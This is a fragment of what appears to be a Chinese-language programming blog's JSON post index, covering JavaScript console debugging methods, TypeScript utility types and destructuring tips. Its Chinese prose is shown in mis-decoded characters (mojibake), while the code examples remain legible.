(a) { return (b) =\u0026gt; { return a * b; } } const mutiplyByTwo = mutiply(2); console.log(mutiplyByTwo(4)); outputï¼š 1 \u0026gt; 8 ","date":"2022-11-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52487952181_5991519a08_o.jpg","permalink":"https://wayneblog.ga/2022-11-09/js-call-apply-bind/","title":"ä½¿ç”¨ bindã€callã€apply æ”¹è®Š this æŒ‡å‘çš„å°è±¡"},{"content":" åƒè€ƒç¶²ç«™\nå¯« JavaScript éœ€è¦æª¢è¦–é‹ä½œæ˜¯å¦æ­£ç¢ºæ™‚å€™ï¼Œéƒ½æœƒä½¿ç”¨ console.log ä¾†æª¢è¦–è¼¸å‡ºæˆ–é‹ç®—çš„å€¼ï¼Œè€Œ console çš„é‹ç”¨æŠ€å·§ä¸åƒ…åƒ…åªæœ‰å°‡å€¼å‘ˆç¾åœ¨é–‹ç™¼çš„ Console ä»‹é¢ä¸­ã€‚æœ¬ç¯‡å°±ä¾†ä»‹ç´¹è¨±å¤š console èªæ³•çš„å¯¦æˆ°é‹ç”¨æ–¹æ³•å§ï¼\né¦–å…ˆï¼Œåœ¨æ­¤å…ˆæº–å‚™ä¸€ä»½ç­‰ç­‰æœƒç”¨åˆ°çš„ç‰©ä»¶åŠé™£åˆ—ä½œç‚ºä»¥ä¸‹ç¯„ä¾‹ä½¿ç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 const Ming = { name: \u0026#39;å°æ˜\u0026#39;, age: 15, favorite: \u0026#39;é‹ç‡’æ„éºµ\u0026#39; } const Jay = { name: \u0026#39;æ°å€«\u0026#39;, age: 16, favorite: \u0026#39;ç‚’éºµ\u0026#39; } const Auntie = { name: \u0026#39;æ¼‚äº®é˜¿å§¨\u0026#39;, age: 21, favorite: \u0026#39;è˜¿è””ç³•\u0026#39; } const people = [Ming, Jay, Auntie]; ç‚º console.log çš„ç¨‹å¼ç¢¼ä¸Šè‰² æœ‰åœ¨ Facebook é é¢ä¸­é–‹å•Ÿéé–‹ç™¼è€…å·¥å…·å—ï¼Ÿå¦‚æœæœ‰ï¼Œç›¸ä¿¡ä½ å°æ–¼ä»¥ä¸‹é€™å¼µåœ–ä¸¦ä¸é™Œç”Ÿã€‚\nConsole ä¸­çš„æ–‡å­—ä¸¦éåªæœ‰å›ºå®šçš„è‰²å½©ï¼Œå®ƒèˆ‡ç¶²é ä¸­çš„æ–‡å­—ä¸€æ¨£ï¼Œéƒ½å¯ä»¥é€é CSS çš„èªæ³•ä¾†èª¿æ•´å…¶è‰²å½©ï¼Œåªè¦åœ¨ log çš„æ–‡å­—å‰æ–¹å…ˆåŠ å…¥ %c å¾Œï¼Œåœ¨ , å¾Œæ–¹çš„åƒæ•¸å°±èƒ½å¤ å‚³å…¥ CSS èªæ³•åšç‚ºåƒæ•¸ï¼Œä¸¦ä¸”èª¿æ•´ Console ä¸­å‘ˆç¾çš„æ–‡å­—æ¨£å¼ã€‚\n1 console.log(`%c ${Ming.name} æœ‰ç‘Ÿç‘Ÿçš„é¡è‰²`, \u0026#39;color: orange; font-size: 24px\u0026#39;); console.table()ï¼šä½¿ç”¨è¡¨æ ¼çš„æ–¹å¼é™³åˆ—é™£åˆ—çš„è³‡è¨Š ç•¶è¦å‘ˆç¾è³‡æ–™æ–¼ Console ä»‹é¢ä¸­ï¼Œåšå¸¸è¦‹çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ log çš„æ–¹æ³•ï¼š\n1 2 3 4 5 6 // åŸºæœ¬ç”¨æ³• console.log(Ming); console.log(Jay); console.log(Auntie); console.log(people); ç•¶ç„¶ï¼Œé€™æ¨£çš„ç”¨æ³•çµ•å°æ²’æœ‰å•é¡Œï¼Œé€éæ­¤æ–¹æ³•å¯ä»¥å°‡å€¼ä¸€ä¸€é™³åˆ—å‡ºä¾†ï¼Œä¸éç•¶é€™äº›æ•¸å€¼æ˜¯ å…·æœ‰é—œè¯æ€§ æ™‚ï¼Œä¸€èˆ¬çš„ log å°±ç„¡æ³•æ¯”è¼ƒå…©è€…ä¹‹é–“çš„é—œä¿‚ã€‚\nconsole.table() é‡å°ç‰©ä»¶ä¹‹é–“æœ‰ç›¸åŒçš„å±¬æ€§åç¨±æ™‚ï¼Œå°±èƒ½å¤ è¼•æ˜“çš„æ¯”è¼ƒç›¸åŒå±¬æ€§ä¹‹é–“çš„é—œä¿‚ã€‚\n1 2 console.table([Ming, Jay, Auntie]); console.table(people); é™¤æ­¤ä¹‹å¤–ï¼Œè¡¨æ ¼ä¸Šæ–¹çš„æ¨™é ­é‚„å¯ä»¥é»é¸ä½œç‚ºæ’åºä½¿ç”¨ï¼Œå¦‚æœæ‹¿åˆ°ä¸€å€‹ JSON æƒ³æ¯”å°å…¶ä¸­çš„å€¼ï¼Œé‚„è¦è½‰è²¼åˆ° Excel æˆ–æ˜¯ sort() èªæ³•å®‰æ’ï¼Œä¸å¦‚ç›´æ¥æ”¹ç”¨ table() é€²è¡Œæ¯”è¼ƒå§ã€‚\nconsole.group()ï¼šç¾¤çµ„åŒ–å¤§é‡çš„ log è³‡è¨Š ä½¿ç”¨ log() è§€çœ‹è¿´åœˆå€¼æ˜¯åˆæƒ…åˆç†çš„ï¼Œä¸éç•¶é™£åˆ—çš„é•·åº¦æœ‰ä¸Šç™¾ç­†æ™‚ï¼ŒConsole ä»‹é¢ä¸­çš„è³‡æ–™é‚„çœŸæœƒæ»¾åˆ°ä»¤äººå­ä¸–ã€‚\n1 2 3 4 for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } åœ¨è¿´åœˆä¸­ä½¿ç”¨ console.log() æœƒä¸€ä¸€å‘ˆç¾è³‡æ–™ï¼Œæ•¸é‡ä¸€å¤šçœ‹èµ·ä¾†å°±æœƒé¡¯çš„å¾ˆåƒåŠ›\nä½¿ç”¨ console.group()ã€console.groupEnd() è¨­ç½®ç¾¤çµ„çš„èµ·è¨–ï¼Œåœ¨ Console çš„ä»‹é¢ä¸­å°±èƒ½æ–¹ä¾¿çš„æ”¶åˆç¾¤çµ„å…§å®¹ã€‚\n1 2 3 4 5 6 console.group(\u0026#39;è¿´åœˆç¾¤çµ„\u0026#39;); for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } console.groupEnd(); console.group(/* ç¾¤çµ„åç¨± */) å¯ä»¥å‚³å…¥ ç¾¤çµ„åç¨± åšç‚ºåƒæ•¸ï¼Œä½œç‚ºåœ¨ Console ä»‹é¢ä¸­è¾¨è­˜ç¾¤çµ„çš„é¡¯ç¤ºåç¨±ï¼Œåœ¨ä»‹é¢ä¸­çš„ç¾¤çµ„åç¨±ä¹Ÿæœƒä»¥ç²—é«”åç¨±ï¼Œä¸¦ä¸”å¯ä»¥é»æ“Šç®­é ­ç¬¦è™Ÿæ”¶åˆç¾¤çµ„å…§å®¹ã€‚\nconsole.time()ï¼šé–‹ç™¼è€…æœ€æ„›æ–¤æ–¤è¨ˆè¼ƒé‚£ 1ms çš„æ•ˆèƒ½äº† æ¯ç•¶å¯«å‡ºç¥é‚è¼¯çš„æ™‚å€™ï¼Œéƒ½æœƒæ“”å¿ƒé›»è…¦æ•ˆèƒ½è·Ÿä¸ä¸Šè‡ªå·±çš„æ€ç¶­ï¼Œé€™æ™‚å€™å°±å¯ä»¥ä½¿ç”¨ time() è¿½è¹¤ç‰‡æ®µç¨‹å¼ç¢¼æ‰€è™•ç†çš„æ™‚é–“å·®ï¼Œå¾—çŸ¥è‡ªå·±æ˜¯ä¸æ˜¯è©²æ›å°é›»è…¦è§£æ±ºå•é¡Œã€‚\n1 2 3 4 5 6 7 // æ™‚é–“è¿½è¹¤ console.time(\u0026#39;è¿´åœˆè™•ç†æ™‚é–“\u0026#39;); for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } console.timeEnd(\u0026#39;è¿´åœˆè™•ç†æ™‚é–“\u0026#39;); åœ¨èµ·è¨–ä¸­åˆ†åˆ¥åŠ å…¥ time() ä»¥åŠ timeEnd()ï¼ŒåŸ·è¡Œç¨‹å¼ç¢¼å¾Œå°±å¯ä»¥ç²å¾—è™•ç†çš„çµæœã€‚\nconsole.dir()ï¼šä»¥ç‰©ä»¶çš„å½¢å¼å‘ˆç¾è³‡æ–™ 1 2 3 // HTML \u0026lt;p\u0026gt;æ¨è–¦çš„ Console èªæ³•\u0026lt;/p\u0026gt; const p = document.querySelector(\u0026#39;p\u0026#39;); console.log(p); ç•¶ä½¿ç”¨ console.log() æŸ¥çœ‹ DOM å…ƒç´ ï¼Œä¸¦æƒ³äº†è§£å…¶ä¸­å¯ç”¨çš„æ–¹æ³•æˆ–å±¬æ€§æ™‚â€¦ï¼Œå®ƒå¯èƒ½æœƒå‡ºç¾å¦‚ä¸‹å¸¶é»å¤±æœ›çš„æ¨™ç±¤ï¼Œä¸¦ä¸”å¿ƒè£¡é»˜ç½µï¼š\nè¦é€™å€‹å¹¹å˜›å•¦ è¦çŸ¥é“çš„æ˜¯ç‰©ä»¶å±¬æ€§ã€å±¬æ€§ é€™æ™‚å€™éœ€è¦çš„æ˜¯ console.dir()ï¼Œä½ æœƒç™¼ç¾å¦ä¸€å€‹æ–°ä¸–ç•Œï¼ŒåŸæœ¬çš„ DOM å…ƒç´ è¢«æ”¹ç‚ºç‰©ä»¶çš„å½¢å¼å‘ˆç¾ï¼Œä½ å¯ä»¥è¼•é¬†å±•é–‹æ­¤ç‰©ä»¶ï¼Œä¸¦æª¢è¦–è£¡é¢æœ‰å“ªäº›å¯ç”¨å±¬æ€§ã€‚\n1 2 const p = document.querySelector(\u0026#39;p\u0026#39;); console.dir(p); å±•é–‹çš„ P å…ƒç´ ï¼ŒåŒ…å«å…¶ä¸­æ‰€æœ‰çš„å±¬æ€§ï¼ˆé€™åœ¨æ“ä½œ DOM æ™‚æ¥µç‚ºå¥½ç”¨ï¼‰\nconsole.error() å¯«ç¨‹å¼æœ‰éŒ¯èª¤æ˜¯é›£å…çš„ï¼Œä½†æ˜¯å¦‚æœæ˜¯éŒ¯èª¤ï¼Œå»æ²’æœ‰æ˜ç¢ºçš„æç¤ºå°è‡´æ²’æœ‰è¢«ç™¼ç¾å•é¡Œï¼Œå°±å¤±å»æç¤ºçš„æ„ç¾©äº†ï¼Œå¦‚æœæƒ³è®“ Console çš„å…§å®¹æ›´åŠ é†’ç›®ï¼Œå¯ä»¥ä½¿ç”¨ console.error() ä½¿è¨Šæ¯åœ¨ Console ä»‹é¢ä¸­ä»¥éŒ¯èª¤çš„å½¢å¼å‘ˆç¾ã€‚\n1 console.error(`${Ming.name} ä½ å®Œè›‹äº†`); ç•¶é‹ç”¨åœ¨ä¸€èˆ¬æ–‡å­—è¨Šæ¯ä¸Šæ™‚ï¼Œä¹Ÿå¯ä»¥å±•é–‹è¨Šæ¯ä¸¦èªªæ˜éŒ¯èª¤ä¾†æºè‡ªå“ªä¸€æ®µç¨‹å¼ç¢¼ã€‚\nåœ¨ AJAX çš„æœªç¢ºèªç‹€æ…‹ä¸­ï¼Œä¹Ÿæœƒä½¿ç”¨ console.error ä¾†å‘ˆç¾éŒ¯èª¤çš„å›é¥‹è¨Šæ¯ï¼Œä»¥ä¸‹ç¯„ä¾‹åˆ»æ„å°‡ API è·¯å¾‘èª¿æ•´æˆéŒ¯èª¤çš„ï¼Œä¸¦é€é console.error() ä¾†å°‡éŒ¯èª¤çš„è³‡è¨Šå‘ˆç¾åœ¨ Console ä»‹é¢ä¸­\n1 2 3 4 5 6 // Error axios.get(\u0026#39;https://randomuser.me/apis\u0026#39;) .then((res) =\u0026gt; console.log(res)) .catch((error) =\u0026gt; { console.error(\u0026#39;å¾…èªŒå¤§æ¢å•¦: \u0026#39;, error.response) }) console.warn() éŒ¯èª¤å¤ªçªå…€äº†å—ï¼Ÿå¦‚æœæ˜¯è‡ªè¡Œé–‹ç™¼çš„å‡½å¼åº«ï¼Œå·²ç¶“é€éå„ç¨®å½¢å¼é¿å…ç¨‹å¼ç¢¼å‡ºéŒ¯ï¼Œä½†é‚„æ˜¯æƒ³æŠŠæœ‰éŒ¯èª¤çš„è¨Šæ¯çµ¦äºˆé–‹ç™¼è€…çŸ¥é“ï¼Œé‚£éº¼å‰‡å¯ä»¥ä½¿ç”¨ console.warn()ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 // Warning /*** * è¶…ç²¾ç¾å‡½å¼åº« ğŸ’– * @param {number} num ç´”æ•¸å€¼ * @param {string} text è«‹å‚³å…¥å­—ä¸² */ function superMagicLibrary(num, text) { if (typeof num !== \u0026#39;number\u0026#39;) { console.warn(\u0026#39;å°Šé‡ä¸€ä¸‹å¥½å—ï¼Œè«‹å‚³å…¥ç´”æ•¸å€¼\u0026#39;) } } superMagicLibrary(\u0026#39;å­—ä¸²\u0026#39;); å‡½å¼åº«ä¸­å¤§å¤šæœƒé¿å…å·²çŸ¥çš„éŒ¯èª¤ï¼Œå¦‚æœè¦å‹å–„çš„çµ¦äºˆå›é¥‹ï¼Œå¯ä»¥ä½¿ç”¨ warn() ä»£æ›¿ error() æé†’é–‹ç™¼è€…æ›´å¥½çš„åšæ³•ã€‚\nconsole.clear() å¦‚æœè¦ºå¾— Console ä»‹é¢å·²ç¶“å……æ»¿äº†è¨±å¤šä¸å¿…è¦çš„è³‡è¨Šï¼Œæƒ³è¦å°ˆæ³¨æ–¼ç•¶å‰é–‹ç™¼çš„ç¨‹å¼ç¢¼ï¼Œé‚£éº¼å¯ä»¥åŠ å…¥ console.clear()ã€‚\nç•«é¢ä¸­æœƒå‡ºç¾ Console was cleared çš„å­—çœ¼\næ­¤èªæ³•äº¦å¯åœ¨ Console ä»‹é¢ä¸­ç›´æ¥è¼¸å…¥ï¼Œæœƒç›´æ¥æ¸…é™¤ç•¶ä¸‹çš„æ‰€æœ‰è³‡è¨Šå…§å®¹ã€‚\nä¸éè«‹æ…ç”¨æ­¤æ–¹æ³•ï¼Œå¦‚æœéš¨æ„æ’å…¥ console.clear() åœ¨ä¸åŒçš„æª”æ¡ˆä¸­ï¼Œä¸çŸ¥æƒ…çš„å¤¥ä¼´ä¸€å®šæœƒåœ¨é–‹ç™¼ä¸­å¡å¾ˆä¹…ï¼Œå¯èƒ½ç™¼ç”Ÿçš„æƒ…å¢ƒæœ‰â€¦ï¼š\nå¥‡æ€ªï¼Œæˆ‘å¯«çš„ Code æ€éº¼éƒ½æ²’é¡¯ç¤ºåœ¨ Console ç·¨è­¯å™¨å£äº†å—ï¼Ÿæ€éº¼å¥½åƒæ²’æœ‰é‹ä½œ æˆ‘çš„ Chrome æ€ªæ€ªçš„ é‚„æœ‰å“ªäº›æ–¹æ³•ä½ ä¹Ÿå¸¸ç”¨ï¼Œä½†æ²’æœ‰ä»‹ç´¹åˆ°çš„å‘¢ï¼Ÿæ­¡è¿åœ¨åº•ä¸‹ç•™è¨€å€ç•™è¨€å–”\n","date":"2022-11-03T00:00:00Z","image":"https://live.staticflickr.com/65535/52473860621_0ede00e99a_o.jpg","permalink":"https://wayneblog.ga/2022-11-03/js-8-console-tricks/","title":"8 æ‹› JavaScript Console é‹ç”¨æŠ€å·§ï¼Œè®“ä½ é™¤éŒ¯æ›´é«˜æ•ˆ"},{"content":" åƒè€ƒç¶²ç«™\nå¾ˆå¤šäººåœ¨å¹³æ™‚çš„é–‹ç™¼ä¸­ä½¿ç”¨åˆ°äº† TypeScriptï¼Œä½†æ˜¯å¯èƒ½åªæ˜¯å–®ç´”ä½¿ç”¨äº†ä¸€äº›åŸºæœ¬çš„é¡å‹ï¼Œä½†å¾ˆå¤šäººä¸çŸ¥é“å…¶å¯¦ TypeScript è‡ªå¸¶äº†å¾ˆå¤šéå¸¸æ–¹ä¾¿çš„æ–¹æ³•ï¼Œæ¥ä¸‹ä¾†æˆ‘å°±çµåˆä¾‹å­ï¼Œçµ¦å¤§å®¶ä»‹ç´¹ä¸€ä¸‹é€™äº›å¾ˆæ–¹ä¾¿çš„æ–¹æ³•ã€‚\nTypeScript è‡ªå¸¶çš„æ–¹æ³• Partial ä½œç”¨ Partial å°‡é¡å‹çš„å±¬æ€§è®Šæˆå¯é¸\nä¾‹å­ å‡å¦‚æˆ‘ç¾åœ¨æœ‰å€‹ interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } æœ‰ä¸€å¤©ï¼Œæˆ‘æƒ³æŠŠ IUser èº«ä¸Šçš„å±¬æ€§éƒ½è®Šæˆå¯é¸çš„ï¼Œé‚£æˆ‘å¯èƒ½æœƒå†å¯«ä¸€å€‹ interface\n1 2 3 4 5 interface IUser2 { name?: string; age?: number; gender?: number; } ä½†æ˜¯å¦‚æœå±¬æ€§å¤šäº†çš„è©±ï¼Œæˆ‘å€‘åˆå¾—å¯«å¾ˆå¤šé¡å¤–çš„ä»£ç¢¼ï¼Œé€™å€‹æ™‚å€™å°±å¯ä»¥ç›´æ¥ç”¨ Partial\n1 2 3 4 5 6 7 8 9 type IUser2 = Partial\u0026lt;IUser1\u0026gt; // ç­‰åŒæ–¼ interface IUser2 { name?: string; age?: number; gender?: number; } åŸç† 1 2 3 type Partial\u0026lt;T\u0026gt; = { [P in keyof T]?: T[P]; }; Required ä½œç”¨ Required å°‡é¡å‹çš„å±¬æ€§è®Šæˆå¿…é¸\nä¾‹å­ å‡å¦‚æˆ‘ç¾åœ¨æœ‰å€‹ interface\n1 2 3 4 5 interface IUser1 { name: string; age?: number; gender?: number; } å¯ä»¥çœ‹åˆ°æœ‰ä¸€äº›å±¬æ€§æ˜¯å¯é¸çš„ï¼Œä½†æ˜¯çªç„¶æœ‰ä¸€å¤©ï¼Œæˆ‘æƒ³è®“æ‰€æœ‰å±¬æ€§è®Šæˆå¿…é¸æˆ‘æœƒå†å¯«ä¸€å€‹ interface\n1 2 3 4 5 interface IUser2 { name: string; age: number; gender: number } ä½†å¦‚æœå±¬æ€§å¤šäº†çš„è©±ï¼Œåˆè¦å¯«å¾ˆå¤šé¡å¤–çš„ä»£ç¢¼ï¼Œé€™æ™‚å€™ Required å°±æ´¾ä¸Šç”¨å ´äº†\n1 2 3 4 5 6 7 8 9 type IUser2 = Required\u0026lt;IUser1\u0026gt; // ç­‰åŒæ–¼ interface IUser2 { name: string; age: number; gender: number } åŸç† 1 2 3 type Required\u0026lt;T\u0026gt; = { [P in keyof T]-?: T[P] }; Pick ä½œç”¨ Pick å¾æŸå€‹é¡å‹ä¸­æŒ‘å‡ºä¸€äº›å±¬æ€§å‡ºä¾†\nä¾‹å­ å‡å¦‚æˆ‘ç¾åœ¨æœ‰å€‹ interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } æœ‰ä¸€å¤©æˆ‘æƒ³è¦å¯«ä¸€å€‹æ–° interfaceï¼Œå®ƒåªæ“æœ‰ ageã€gender é€™å…©å€‹å±¬æ€§ï¼Œé‚£æˆ‘æœƒé‡æ–°å¯«ä¸€å€‹ interface\n1 2 3 4 interface IUser2 { age: number; gender: number; } ä½†å…¶å¯¦ä½¿ç”¨ Pick éå¸¸æ–¹ä¾¿å»åšé€™ä»¶äº‹\n1 2 3 4 5 6 7 8 type IUser2 = Pick\u0026lt;IUser1, \u0026#39;age\u0026#39; | \u0026#39;gender\u0026#39;\u0026gt; // ç­‰åŒæ–¼ interface IUser2 { age: number; gender: number; } åŸç† 1 2 3 type Pick\u0026lt;T, K extends keyof T\u0026gt; = { [P in K]: T[P]; }; Omit ä½œç”¨ Omit\u0026lt;T, K extends keyof any\u0026gt; çš„ä½œç”¨æ˜¯ä½¿ç”¨ T é¡å‹ä¸­é™¤äº† K é¡å‹çš„æ‰€æœ‰å±¬æ€§ï¼Œä¾†æ§‹é€ ä¸€å€‹æ–°çš„é¡å‹ã€‚\nä¾‹å­ å‡å¦‚æˆ‘ç¾åœ¨æœ‰å€‹ interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } æœ‰ä¸€å¤©æˆ‘æƒ³è¦å¯«ä¸€å€‹æ–° interfaceï¼Œå®ƒåªæ“æœ‰ ageã€gender é€™å…©å€‹å±¬æ€§ï¼Œé‚£æˆ‘æœƒé‡æ–°å¯«ä¸€å€‹ interface\n1 2 3 4 interface IUser2 { age: number; gender: number; } ä½†å…¶å¯¦ä½¿ç”¨ Omit éå¸¸æ–¹ä¾¿å»åšé€™ä»¶äº‹\n1 2 3 4 5 6 7 8 type IUser2 = Omit\u0026lt;IUser1, \u0026#39;name\u0026#39;\u0026gt; // ç­‰åŒæ–¼ interface IUser2 { age: number; gender: number; } åŸç† 1 type Omit\u0026lt;T, K extends keyof any\u0026gt; = Pick\u0026lt;T, Exclude\u0026lt;keyof T, K\u0026gt;\u0026gt;; NonNullable ä½œç”¨ NonNullable çš„ä½œç”¨æ˜¯ç”¨ä¾†éæ¿¾é¡å‹ä¸­çš„ null åŠ undefined é¡å‹ã€‚\nä¾‹å­ 1 2 3 4 5 // string | number type T0 = NonNullable\u0026lt;string | number | undefined\u0026gt;; // string[] type T1 = NonNullable\u0026lt;string[] | null | undefined\u0026gt;; åŸç† 1 type NonNullable\u0026lt;T\u0026gt; = T extends null | undefined ? never : T; ReturnType ä½œç”¨ ReturnType çš„ä½œç”¨æ˜¯ç”¨ä¾†å¾—åˆ°ä¸€å€‹å‡½æ•¸çš„è¿”å›å€¼é¡å‹ã€‚\nä¾‹å­ å‡å¦‚æˆ‘æƒ³å®šç¾©ä¸€å€‹è®Šé‡ä¾†æ¥å—ä¸€å€‹å‡½æ•¸çš„è¿”å›å€¼ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€éº¼å®šç¾©é€™å€‹è®Šé‡çš„é¡å‹ï¼Œé€™å€‹æ™‚å€™å¯ä»¥ç”¨ ReturnType\n1 2 3 4 5 6 type Func = (value: number) =\u0026gt; string; let str: ReturnType\u0026lt;Func\u0026gt;; const fun: Func = (value: number) =\u0026gt; String(value) str = fun(1) åŸç† 1 2 type ReturnType\u0026lt;T extends (...args: any[]) =\u0026gt; any\u0026gt; = T extends (...args: any[]) =\u0026gt; infer R ? R : any; Exclude ä½œç”¨ Exclude\u0026lt;T, U\u0026gt; çš„ä½œç”¨æ˜¯å°‡æŸå€‹é¡å‹ä¸­å±¬æ–¼å¦ä¸€å€‹çš„é¡å‹ç§»é™¤æ‰ã€‚\nä¾‹å­ 1 2 3 4 5 type T0 = Exclude\u0026lt;\u0026#34;a\u0026#34; | \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34;\u0026gt;; // \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34; type T1 = Exclude\u0026lt;\u0026#34;a\u0026#34; | \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34; | \u0026#34;b\u0026#34;\u0026gt;; // \u0026#34;c\u0026#34; type T2 = Exclude\u0026lt;string | number | (() =\u0026gt; void), Function\u0026gt;; // string | number åŸç† 1 type Exclude\u0026lt;T, U\u0026gt; = T extends U ? never : T; Record ä½œç”¨ Record\u0026lt;K extends keyof any, T\u0026gt; çš„ä½œç”¨æ˜¯å°‡ K ä¸­æ‰€æœ‰çš„å±¬æ€§çš„å€¼è½‰åŒ–çˆ² T é¡å‹ã€‚\nä¾‹å­ 1 2 3 4 5 6 7 8 9 10 11 interface PageInfo { title: string; } type Page = \u0026#34;home\u0026#34; | \u0026#34;about\u0026#34; | \u0026#34;contact\u0026#34;; const x: Record\u0026lt;Page, PageInfo\u0026gt; = { about: { title: \u0026#34;about\u0026#34; }, contact: { title: \u0026#34;contact\u0026#34; }, home: { title: \u0026#34;home\u0026#34; }, }; åŸç† 1 2 3 type Record\u0026lt;K extends keyof any, T\u0026gt; = { [P in K]: T; }; Readonly ä½œç”¨ Readonly çš„ä½œç”¨æ˜¯å°‡æŸå€‹é¡å‹æ‰€æœ‰å±¬æ€§è®Šçˆ²åªè®€å±¬æ€§ï¼Œä¹Ÿå°±æ„å‘³ç€é€™äº›å±¬æ€§ä¸èƒ½è¢«é‡æ–°è³¦å€¼ã€‚\nä¾‹å­ 1 2 3 4 5 6 7 8 9 10 interface Todo { title: string; } const todo: Readonly\u0026lt;Todo\u0026gt; = { title: \u0026#34;Delete inactive users\u0026#34; }; todo.title = \u0026#34;Hello\u0026#34;; // Error: cannot reassign a readonly property åŸç† 1 2 3 type Readonly\u0026lt;T\u0026gt; = { readonly [P in keyof T]: T[P]; }; ","date":"2022-10-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52459954880_4228a13922_o.png","permalink":"https://wayneblog.ga/2022-10-28/ts-useful-tricks/","title":"TypeScript çš„å¯¦ç”¨æ–¹æ³•ï¼å¤§å®¶ä¸€å®šè¦å­¸æœƒå•Šï¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\næœ€è¿‘é‡æº«äº†ä¸€éç´…å¯¶æ›¸ï¼Œç™¼ç¾ä¸€äº›æ¯”è¼ƒå¥½ç©çš„å¯«æ³•ï¼Œå¾ˆå¤šæ±è¥¿æ—¥å¸¸éƒ½åœ¨ç”¨ï¼Œä½†æ˜¯ç™¼ç¾é‚„æœƒæœ‰ä¸ä¸€æ¨£çš„å¯«æ³•, çµåˆä¸€äº›æ—¥å¸¸å·¥ä½œä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œçˆ²å¤§å®¶ç¸½çµä¸€ç¯‡æ—¥å¸¸ç¶“å¸¸ä½¿ç”¨å¯èƒ½é‚„ä¸çŸ¥é“çš„é»ï¼Œå¸Œæœ›å°ä½ èƒ½æœ‰æ‰€å¹«åŠ©ã€‚\nä¸€è¡Œä»£ç¢¼å®Œæˆçµæ§‹åŠ è³¦å€¼ æˆ‘å€‘æ—¥å¸¸ç¶“å¸¸ä½¿ç”¨çµæ§‹è³¦å€¼ï¼Œä¸€èˆ¬éƒ½æ˜¯å…ˆçµæ§‹ï¼Œå†è³¦å€¼ï¼Œç•¶ç„¶æˆ‘å€‘ä¹Ÿå¯ä»¥ä¸€è¡Œå°±å®Œæˆè§£æ§‹åŠ è³¦å€¼æ“ä½œï¼Œçœ‹èµ·ä¾†éå¸¸ç°¡åŒ–ï¼Œç•¶ç„¶å¯è®€æ€§ä½ æ‡‚å¾—ï¼\n1 2 3 4 5 let people = { name: null, age: null }; let result = { name: \u0026#39;å¼µä¸‰\u0026#39;, age: 16 }; ({ name: people.name, age: people.age} = result); console.log(people) // {\u0026#34;name\u0026#34;:\u0026#34;å¼µä¸‰\u0026#34;,\u0026#34;age\u0026#34;:16} å°åŸºç¤æ•¸æ“šé¡å‹é€²è¡Œè§£æ§‹ æ—¥å¸¸ä¸­æˆ‘å€‘æ‡‰è©²ç”¨ä¸åˆ°é€™æ¨£çš„å ´æ™¯ï¼Œä½†æ˜¯å¯¦éš›ä¸Šæˆ‘å€‘ä¹Ÿå¯ä»¥å°åŸºç¤æ•¸æ“šé¡å‹è§£æ§‹ã€‚\n1 2 const {length : a} = \u0026#39;1234\u0026#39;; console.log(a) // 4 å°æ•¸çµ„è§£æ§‹å¿«é€Ÿæ‹¿åˆ°æœ€å¾Œä¸€é …å€¼ å¯¦éš›ä¸Šæˆ‘å€‘æ˜¯å¯ä»¥å°æ•¸çµ„è§£æ§‹è³¦å€¼æ‹¿åˆ° length å±¬æ€§çš„ï¼Œé€šéé€™å€‹ç‰¹æ€§ä¹Ÿå¯ä»¥åšæ›´å¤šçš„äº‹æƒ…ã€‚\n1 2 3 4 5 const arr = [1, 2, 3]; const { 0: first, length, [length - 1]: last } = arr; first; // 1 last; // 3 length; // 3 å°‡ä¸‹æ¨™è½‰çˆ²ä¸­æ–‡é›¶ä¸€äºŒä¸‰\u0026hellip; æ—¥å¸¸å¯èƒ½æœ‰çš„åˆ—è¡¨æˆ‘å€‘éœ€è¦å°‡å°æ‡‰çš„ 012345 è½‰çˆ²ä¸­æ–‡çš„ä¸€ã€äºŒã€ä¸‰ã€å››ã€äº”\u0026hellip;ï¼Œåœ¨è€çš„é …ç›®çœ‹åˆ°é‚„æœ‰é€šéè‡ªå·±æ‰‹å‹•å®šç¾©å¾ˆå¤šè¡Œé€™æ¨£çš„å¯«æ³•ï¼Œæ–¼æ˜¯å¯«äº†ä¸€å€‹é€™æ¨£çš„æ–¹æ³•è½‰æ›\n1 2 3 4 5 6 export function transfromNumber(number){ const INDEX_MAP = [\u0026#39;é›¶\u0026#39;ï¼Œ\u0026#39;ä¸€\u0026#39;.....] if(!number) return if(number === 10) return INDEX_MAP[number] return [...number.toString()].reduce( (pre, cur) =\u0026gt; pre + INDEX_MAP[cur] , \u0026#39;\u0026#39; ) } åˆ¤æ–·æ•´æ•¸çš„ä¸åŒæ–¹æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* 1. ä»»ä½•æ•´æ•¸éƒ½æœƒè¢«1æ•´é™¤ï¼Œå³é¤˜æ•¸æ˜¯0ã€‚åˆ©ç”¨é€™å€‹è¦å‰‡ä¾†åˆ¤æ–·æ˜¯å¦æ˜¯æ•´æ•¸ã€‚ä½†æ˜¯å°å­—ç¬¦ä¸²ä¸æº–ç¢º */ function isInteger(obj) { return obj % 1 === 0 } /* 1. æ·»åŠ ä¸€å€‹æ˜¯æ•¸å­—çš„åˆ¤æ–· */ function isInteger(obj) { return typeof obj === \u0026#39;number\u0026#39; \u0026amp;\u0026amp; obj % 1 === 0 } /* 2. ä½¿ç”¨Math.roundã€Math.ceilã€Math.flooråˆ¤æ–· æ•´æ•¸å–æ•´å¾Œé‚„æ˜¯ç­‰æ–¼è‡ªå·±ã€‚åˆ©ç”¨é€™å€‹ç‰¹æ€§ä¾†åˆ¤æ–·æ˜¯å¦æ˜¯æ•´æ•¸*/ 